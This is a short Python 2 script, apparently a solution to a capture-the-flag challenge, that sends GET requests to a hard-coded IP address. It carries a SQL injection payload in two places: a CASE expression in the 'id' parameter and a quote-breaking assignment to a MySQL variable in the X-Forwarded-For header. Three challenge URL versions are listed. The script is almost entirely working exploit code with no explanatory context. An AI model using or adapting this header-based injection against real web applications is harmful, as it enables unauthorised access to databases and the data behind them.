import requests
import time
from urllib import unquote

url = "http://139.59.239.133/?id=case when @nothing then 1 else 2 end"# version 1
#url = "http://139.59.239.133/v2/index.php?id=case when @nothing then 1 else 2 end" # version 2
#url = "http://139.59.239.133/c541c6ed5e28b8762c4383a8238e6f5632cc7df6da8ce9db7a1aa706d1e5c387/?id=case when @nothing then 1 else 2 end" #version 3
header = {"X-FORWARDED-FOR":"' or @nothing:='1"}

content = requests.get(url, headers=header).text
print content
